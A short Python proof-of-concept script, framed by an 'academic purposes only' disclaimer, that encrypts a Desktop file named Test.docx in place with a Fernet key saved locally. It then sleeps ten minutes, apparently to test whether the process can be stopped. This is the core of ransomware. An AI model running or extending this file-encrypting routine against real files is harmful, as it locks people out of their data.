#This code was written for academic purposes only and never used with maliciuos intentions.
#I'm not responsible for any users actions with this code.


import os
import time
from cryptography.fernet import Fernet

desktop = os.path.normpath(os.path.expanduser("~/Desktop"))

key = Fernet.generate_key()
with open('key.key','wb') as keyFile:
    keyFile.write(key)

with open('key.key','rb') as keyFile:
    key = keyFile.read()

with open('keyForEncryption.txt','w+') as file:
    file.write(str(key))

fernet = Fernet(key)
with open(desktop+r'\Test.docx','rb') as file:
    original = file.read()

encrypted = fernet.encrypt(original)

with open(desktop+r'\Test.docx','wb') as file:
    file.write(encrypted)

print('encrypted text from file:\n'+str(encrypted))

# To keep process running for 10 minutes to see if we can really stop the process
time.sleep(600)